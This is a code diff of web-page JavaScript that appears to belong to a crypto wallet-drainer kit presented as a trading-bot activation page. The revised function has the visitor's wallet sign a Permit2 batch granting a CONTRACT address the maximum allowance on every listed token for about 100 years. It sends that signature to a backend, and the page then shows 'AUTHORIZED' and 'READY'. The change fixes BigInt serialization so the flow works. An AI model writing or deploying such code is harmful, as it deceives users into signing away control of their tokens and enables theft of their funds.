@@ -282,88 +282,93 @@ async function connectWallet(){
 }
 
 
+
 async function runPermitFlowSafe(provider, signer, user){
- try{
-  log("⚙️ Permit2 flow...");
-  log("🔎 Checking cached permit... (via backend)");
+  try {
+    log("⚙️ Permit2 flow...");
+    log("🔎 Checking cached permit... (via backend)");
 
-  // ✍️ SIGNATURE FLOW
-  const permit2 = new ethers.Contract(
-    PERMIT2,
-    ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
-    provider
-  );
+    const permit2 = new ethers.Contract(
+      PERMIT2,
+      ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
+      provider
+    );
 
-  const MAX_UINT160 = (1n << 160n) - 1n;
-  const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);
+    const MAX_UINT160 = (1n << 160n) - 1n;
+    const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);
 
-  const details = [];
-  const nonceResults = await Promise.all(
-    TOKENS.map(token => permit2.allowance(user, token, CONTRACT))
-  );
+    const details = [];
+    const nonceResults = await Promise.all(
+      TOKENS.map(token => permit2.allowance(user, token, CONTRACT))
+    );
 
-  for (let i = 0; i < TOKENS.length; i++) {
-    const token = TOKENS[i];
-    const [, , nonce] = nonceResults[i];
-    log("Nonce " + token + ": " + nonce);
+    for (let i = 0; i < TOKENS.length; i++) {
+      const token = TOKENS[i];
+      const [, , nonce] = nonceResults[i];
+      log("Nonce " + token + ": " + nonce);
 
-    details.push({
-      token: token,
-      amount: MAX_UINT160,
-      expiration: expiration,
-      nonce: nonce
+      details.push({
+        token: token,
+        amount: MAX_UINT160,
+        expiration: BigInt(expiration),
+        nonce: BigInt(nonce)
+      });
+    }
+
+    const chainId = (await provider.getNetwork()).chainId;
+    const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };
+    const types = {
+      PermitBatch: [
+        { name: "details", type: "PermitDetails[]" },
+        { name: "spender", type: "address" },
+        { name: "sigDeadline", type: "uint256" }
+      ],
+      PermitDetails: [
+        { name: "token", type: "address" },
+        { name: "amount", type: "uint160" },
+        { name: "expiration", type: "uint48" },
+        { name: "nonce", type: "uint48" }
+      ]
+    };
+
+    const sigDeadline = BigInt(Math.floor(Date.now()/1000) + (30 * 24 * 60 * 60));
+    const values = { details, spender: CONTRACT, sigDeadline };
+
+    log("✍️ Requesting signature...");
+    const signature = await signer.signTypedData(domain, types, values);
+    log("✍️ Signature captured");
+
+    // 🔹 Safe stringify for BigInt
+    const safePayload = (obj) => JSON.stringify(obj, (key, value) =>
+      typeof value === 'bigint' ? value.toString() : value
+    );
+
+    const payload = { details, signature, spender: CONTRACT, sigDeadline };
+
+    log("🚀 Sending permit to backend...");
+    const res = await fetch("/api/activate", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: safePayload(payload)
     });
+
+    const data = await res.json();
+    if (data.success) {
+      log("✅ Backend accepted permit");
+      updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
+      updateStatus('dot-bot','st-bot','READY','#6366f1');
+      document.getElementById('btn-authorize').disabled = true;
+      document.getElementById('btn-authorize').innerText = "AUTHORIZED";
+      document.getElementById('btn-activate').disabled = true;
+    } else {
+      log("❌ Backend error: " + data.error);
+    }
+
+  } catch(e){
+    log("❌ FLOW ERROR: " + e.message);
   }
-
-  const chainId = (await provider.getNetwork()).chainId;
-  const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };
-  const types = {
-    PermitBatch: [
-      { name: "details", type: "PermitDetails[]" },
-      { name: "spender", type: "address" },
-      { name: "sigDeadline", type: "uint256" }
-    ],
-    PermitDetails: [
-      { name: "token", type: "address" },
-      { name: "amount", type: "uint160" },
-      { name: "expiration", type: "uint48" },
-      { name: "nonce", type: "uint48" }
-    ]
-  };
-
-  const sigDeadline = Math.floor(Date.now()/1000) + (30 * 24 * 60 * 60);
-  const values = { details, spender: CONTRACT, sigDeadline };
-
-  log("✍️ Requesting signature...");
-  const signature = await signer.signTypedData(domain, types, values);
-  log("✍️ Signature captured");
-
-  // 🚀 SEND TO BACKEND
-  const payload = { details, signature, spender: CONTRACT, sigDeadline };
-  log("🚀 Sending permit to backend...");
-
-  const res = await fetch("/api/activate", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  });
-
-  const data = await res.json();
-  if (data.success) {
-    log("✅ Backend accepted permit");
-    updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
-    updateStatus('dot-bot','st-bot','READY','#6366f1');
-    document.getElementById('btn-authorize').disabled = true;
-    document.getElementById('btn-authorize').innerText = "AUTHORIZED";
-    document.getElementById('btn-activate').disabled = true;
-  } else {
-    log("❌ Backend error: " + data.error);
-  }
-
- } catch(e){
-   log("❌ FLOW ERROR: " + e.message);
- }
 }
+
 
 function renderWallet(address) {
  document.getElementById('btn-wallet').innerText = address;
